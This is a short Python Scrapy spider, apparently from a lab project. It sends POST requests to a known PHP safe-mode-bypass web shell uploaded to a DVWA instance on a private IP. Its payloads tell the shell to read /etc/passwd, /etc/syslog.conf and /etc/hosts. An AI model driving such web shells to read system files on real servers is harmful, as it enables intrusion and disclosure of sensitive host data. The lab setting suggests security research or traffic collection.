from webshell_crawler.spiders.spider.abstractWebshell_post_spider import AbstractWebshellPostSpider


class webshellPostSpiderSafeMode(AbstractWebshellPostSpider):
    """
    webshell功能

    --  shell
    """
    name = "webshell_post_SafeMode"
    url = "http://10.108.114.132/dvwa/hackable/uploads/php-webshells-master/Safe_Mode%20Bypass%20PHP%204.4.2%20and%20PHP%205.1.2.php"

    # 允许爬取的域名
    allowed_domains = AbstractWebshellPostSpider.allowed_domains
    # 这里存放要爬取的种子队列
    if url in AbstractWebshellPostSpider.available_urls:
        start_urls = [url]
    else:
        start_urls = []


    def submitPost(self, url):
        command_list = ['/etc/syslog.conf', '/etc/passwd', '/etc/hosts']
        for cmd in command_list:
            payload = {'file': cmd, 'B1': 'Go'}
            yield self.submitPayload(url, payload)

